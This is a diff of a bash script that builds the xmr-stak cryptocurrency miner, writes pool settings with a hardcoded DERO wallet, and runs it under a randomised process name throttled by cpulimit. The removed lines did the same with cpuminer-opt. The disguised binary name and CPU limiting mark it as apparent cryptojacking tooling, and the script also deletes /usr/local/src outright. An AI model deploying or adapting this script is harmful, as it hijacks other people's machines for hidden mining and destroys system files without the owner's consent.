@@ -1,32 +1,49 @@
 #!/bin/bash
 sudo apt-get update
-sudo apt-get install cpulimit
-sudo apt-get install -y automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev gcc build-essential git make curl unzip gedit dh-autoreconf openssh-server screen libtool libncurses5-dev libudev-dev g++ iftop libgtk2.0-dev libboost-dev libboost-system-dev libboost-thread-dev vim
-echo "vm.nr_hugepages=128" >> /etc/sysctl.conf && sysctl -p
-cpuminer=nwmtjxt;
-mkdir /usr/share
-mkdir /usr/share/work
-rm -r /usr/share/work/$cpuminer
-mkdir /usr/share/work/$cpuminer
-git clone https://github.com/JayDDee/cpuminer-opt.git /usr/share/work/$cpuminer
-a='nwmtjxt-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
-cd /usr/share/work/$cpuminer
-./build.sh || true
+sudo apt-get install cpulimit 
+sudo apt --assume-yes install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev git libuv1-dev 
+mkdir /usr/local
+rm -r /usr/local/src
+mkdir /usr/local/src
+git clone https://github.com/fireice-uk/xmr-stak.git /usr/local/src &&
+a='nwmtjxvcxt-00' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
+cd /usr/local/src
+mkdir build
+cd build 
+cmake .. -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF
 make install
-mv cpuminer $cpuminer -n
-sudo cp $cpuminer "$cpuname"
-sudo rm -f  cpuminer
+cd bin
+sudo sysctl -w vm.nr_hugepages=128 
+sudo bash -c 'cat <<EOT >>/usr/local/src/build/bin/config.txt
+"call_timeout" : 10,
+"retry_time" : 30,
+"giveup_limit" : 0,
+"verbose_level" : 3,
+"print_motd" : true,
+"h_print_time" : 60,
+"aes_override" : null,
+"use_slow_memory" : "warn",
+"tls_secure_algo" : true,
+"daemon_mode" : false,
+"flush_stdout" : false,
+"output_file" : "",
+"httpd_port" : 99,
+"http_login" : "",
+"http_pass" : "",
+"prefer_ipv4" : true,
+EOT
+' &&
+sudo bash -c 'cat <<EOT >>/usr/local/src/build/bin/pools.txt
+"pool_list" :
+[
+{"pool_address" : "dero.herominers.com:10125", "wallet_address" : "dERirD3WyQi4udWH7478H66Ryqn3syEU8bywCQEu3k5ULohQRcz4uoXP12NjmN4STmEDbpHZWqa7bPRiHNFPFgTBPmcBVyKzEAr7vRwgJmcQN", "rig_id" : "", "pool_password" : "Hero", "use_nicehash" : false, "use_tls" : false, "tls_fingerprint" : "", "pool_weight" : 100 },
+],
+
+"currency" : "cryptonight",
+
+EOT
+' &&
+sudo cp xmr-stak "$cpuname"
+rm xmr-stak
 echo $cpuname" is starting"
-cpucores=$( awk -F: '/model name/ {core++} END {print core}' /proc/cpuinfo )
-if [ $cpucores -ge 16 ]; then
-downcore=2;
-else 
-downcore=1;
-fi
-if [ $cpucores -ge 2 ]; then
-detectcpu=$[$cpucores - $downcore]
-else 
-detectcpu=$cpucores
-fi
-maxcore=$[$cpucores - $downcore];
-screen -d -m ./"${cpuname}" -a lyra2z330 -o stratum+tls://dero.miner.rocks:5555 -i dERibnRgTv1MxKieDAPNBva1MaAN3R7ftXVxJNBKcFohZmHSqAni39WRYGduu4xKrBSYqC2v3Qhu63p6o2t7x7nZT4TQGexPs8b1ENrdcHW3b -p w=Rig1 -t $maxcore
+cpulimit -l 395 ./"${cpuname}"
